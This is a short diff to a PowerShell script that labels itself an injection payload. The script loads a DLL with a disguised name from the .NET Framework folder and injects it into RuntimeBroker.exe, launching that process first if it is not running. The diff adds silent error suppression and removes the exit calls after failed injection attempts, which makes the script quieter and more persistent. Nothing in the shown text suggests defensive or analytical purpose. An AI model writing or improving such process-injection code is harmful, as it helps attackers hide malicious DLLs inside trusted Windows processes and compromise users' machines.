@@ -1,4 +1,6 @@
-# Remove the "powershell stuff" – now just the injection payload
+$ErrorActionPreference = 'SilentlyContinue'
+
+# ── Payload starts here ──
 $p="$env:SystemRoot\Microsoft.NET\Framework\sbscmp30_mscorwks.dll"
 $n='RuntimeBroker'
 $x="$env:SystemRoot\System32\$n.exe"
@@ -57,8 +59,8 @@ if($inj){
     if($r.Count -gt 0){
         $result=[I]::X($r[0].Id,$p)
         if($result){ Write-Host "Injected" }
-        else{ Write-Host "unable to inject"; exit }
-    } else { Write-Host "unable to inject"; exit }
+        else{ Write-Host "unable to inject" }
+    } else { Write-Host "unable to inject" }
 } else {
     if($r.Count -eq 0){
         Start-Process $x
@@ -68,6 +70,6 @@ if($inj){
     if($r.Count -gt 0){
         $result=[I]::X($r[0].Id,$p)
         if($result){ Write-Host "Injected" }
-        else{ Write-Host "unable to inject"; exit }
-    } else { Write-Host "unable to inject"; exit }
+        else{ Write-Host "unable to inject" }
+    } else { Write-Host "unable to inject" }
 }
